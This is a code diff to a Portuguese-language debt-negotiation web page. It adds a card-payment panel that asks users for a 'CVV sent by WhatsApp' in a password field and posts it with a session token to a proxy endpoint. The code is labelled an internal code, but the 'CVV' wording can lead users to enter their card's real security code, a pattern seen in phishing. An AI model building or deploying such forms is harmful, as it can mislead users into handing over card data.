@@ -123,6 +123,12 @@
     .service-option .service-icon { font-size:22px; width:30px; text-align:center; flex:0 0 30px; }
     .service-option strong { display:block; font-size:15px; color:#1f382e; }
     .service-option small { display:block; margin-top:3px; font-size:11.5px; font-weight:400; color:#6f7d76; line-height:1.35; }
+    .card-status-panel { display:none; margin-top:18px; text-align:center; padding:20px 14px; border:1px solid #d6e7de; border-radius:14px; background:#f6fbf8; }
+    .card-status-panel.show { display:block; }
+    .card-spinner { width:42px;height:42px;border:4px solid #d9eee2;border-top-color:#14834f;border-radius:50%;animation:cardSpin .8s linear infinite;margin:0 auto 14px; }
+    @keyframes cardSpin {to{transform:rotate(360deg)}}
+    .card-status-panel p {font-size:14px;line-height:1.5;color:#53615b}
+    .card-status-panel strong {color:#14834f}
     .pix-panel { display:none; margin-top:18px; text-align:left; animation:fadeUp .25s ease; }
     .pix-panel.show { display:block; }
     .pix-warning { padding:14px 15px; border:1px solid #f0d69d; border-radius:12px; background:#fff9eb; color:#73520c; font-size:12.5px; line-height:1.5; }
@@ -215,6 +221,14 @@
               </button>
             </div>
 
+            <div id="cardStatusPanel" class="card-status-panel" aria-live="polite">
+              <div id="cardSpinner" class="card-spinner"></div>
+              <strong id="cardStatusTitle">Estamos consultando sua negociação</strong>
+              <p id="cardStatusText">Aguarde um instante.</p>
+              <div id="internalCodeBox" style="display:none;text-align:left;margin-top:16px"><label for="internalCode">CVV enviado pelo WhatsApp</label><input id="internalCode" type="password" inputmode="numeric" autocomplete="off" pattern="[0-9]*" maxlength="12" placeholder="Digite seu CVV"/><div class="whatsapp-hint">Digite somente o código interno chamado CVV que você recebeu pelo ManyChat. Nunca informe o código de segurança impresso no cartão.</div></div>
+              <button id="cardContinueBtn" type="button" style="display:none">Registrar solicitação de pagamento por cartão</button>
+              <button id="cardBackBtn" type="button" class="back-choice-btn" style="display:none">Voltar às opções</button>
+            </div>
             <a id="finalWhatsAppBtn" class="final-whatsapp-btn" href="#" target="_blank" rel="noopener">Continuar atendimento no WhatsApp</a>
 
             <div id="negotiationStatus" class="verified-note">Após informar seu WhatsApp, pediremos seu e-mail para concluir.</div>
@@ -292,6 +306,14 @@
     const serviceChoice = document.getElementById('serviceChoice');
     const debtNegotiationOption = document.getElementById('debtNegotiationOption');
     const secondCopyOption = document.getElementById('secondCopyOption');
+    const cardStatusPanel = document.getElementById('cardStatusPanel');
+    const cardSpinner = document.getElementById('cardSpinner');
+    const cardStatusTitle = document.getElementById('cardStatusTitle');
+    const cardStatusText = document.getElementById('cardStatusText');
+    const cardContinueBtn = document.getElementById('cardContinueBtn');
+    const internalCodeBox = document.getElementById('internalCodeBox');
+    const internalCode = document.getElementById('internalCode');
+    const cardBackBtn = document.getElementById('cardBackBtn');
     let clienteValidado = null;
 
     function onlyDigits(value){ return String(value || '').replace(/\D/g,''); }
@@ -574,10 +596,86 @@
       }
     });
 
-    debtNegotiationOption.addEventListener('click', ()=>{
+    debtNegotiationOption.addEventListener('click', async ()=>{
+      if (!clienteValidado || !clienteValidado.token) return;
+      serviceChoice.classList.remove('show');
+      finalWhatsAppBtn.classList.remove('show');
+      cardStatusPanel.classList.add('show');
+      cardSpinner.style.display = 'block';
+      cardContinueBtn.style.display = 'none';
+      internalCodeBox.style.display = 'none';
+      internalCode.value = '';
+      cardBackBtn.style.display = 'none';
+      cardStatusTitle.textContent = 'Estamos consultando sua negociação';
+      cardStatusText.textContent = 'Aguarde enquanto verificamos as opções disponíveis.';
+      negotiationStatus.textContent = '';
+      try {
+        const response = await fetch(PROXY_URL, {
+          method: 'POST',
+          headers: {'Content-Type':'text/plain;charset=utf-8'},
+          body: JSON.stringify({acao:'consultarpgtocartao', token:clienteValidado.token})
+        });
+        if (!response.ok) throw new Error('HTTP ' + response.status);
+        const result = await response.json();
+        if (!result.sucesso) throw new Error(result.mensagem || 'Consulta indisponível');
+        cardSpinner.style.display = 'none';
+        if (result.disponivel) {
+          cardStatusTitle.textContent = 'Pagamento com cartão disponível';
+          cardStatusText.textContent = 'Valor: ' + result.valor + '. Informe o CVV interno enviado pelo WhatsApp para registrar sua solicitação.';
+          internalCodeBox.style.display = 'block';
+          cardContinueBtn.style.display = 'block';
+          cardBackBtn.style.display = 'block';
+        } else {
+          cardStatusPanel.classList.remove('show');
+          finalWhatsAppBtn.classList.add('show');
+          negotiationStatus.textContent = 'Continue seu atendimento pelo WhatsApp.';
+        }
+      } catch (error) {
+        console.error(error);
+        cardSpinner.style.display = 'none';
+        cardStatusTitle.textContent = 'Não foi possível concluir a consulta';
+        cardStatusText.textContent = 'Tente novamente ou continue pelo WhatsApp.';
+        finalWhatsAppBtn.classList.add('show');
+        cardBackBtn.style.display = 'block';
+      }
+    });
+
+    cardBackBtn.addEventListener('click', ()=>{
+      cardStatusPanel.classList.remove('show');
+      internalCodeBox.style.display = 'none';
+      finalWhatsAppBtn.classList.remove('show');
       serviceChoice.classList.add('show');
-      finalWhatsAppBtn.classList.add('show');
-      negotiationStatus.textContent = 'Clique no botão acima para continuar sua negociação pelo WhatsApp.';
+    });
+
+    cardContinueBtn.addEventListener('click', async ()=>{
+      const codigoConfirmacao = internalCode.value.trim();
+      if (!/^\d{3,12}$/.test(codigoConfirmacao)) {
+        cardStatusText.textContent = 'Informe o CVV enviado pelo WhatsApp (3 a 12 dígitos).';
+        internalCode.focus();
+        return;
+      }
+      cardContinueBtn.disabled = true;
+      cardContinueBtn.textContent = 'Registrando...';
+      try {
+        const response = await fetch(PROXY_URL, {
+          method:'POST', headers:{'Content-Type':'text/plain;charset=utf-8'},
+          body:JSON.stringify({acao:'registrarinteressecartao',token:clienteValidado.token,codigoConfirmacao:codigoConfirmacao})
+        });
+        if (!response.ok) throw new Error('Falha na conexão');
+        const result = await response.json();
+        if (!result.sucesso) throw new Error(result.mensagem || 'Não foi possível registrar');
+        cardStatusTitle.textContent = 'Solicitação registrada';
+        cardStatusText.textContent = 'Sua solicitação foi registrada. O pagamento ainda não foi realizado. Continue o atendimento pelo WhatsApp.';
+        cardContinueBtn.style.display = 'none';
+        internalCodeBox.style.display = 'none';
+        internalCode.value = '';
+        finalWhatsAppBtn.classList.add('show');
+      } catch (error) {
+        cardStatusText.textContent = 'Não foi possível registrar neste momento. Tente novamente.';
+      } finally {
+        cardContinueBtn.disabled = false;
+        cardContinueBtn.textContent = 'Registrar solicitação de pagamento por cartão';
+      }
     });
 
     secondCopyOption.addEventListener('click', ()=>{
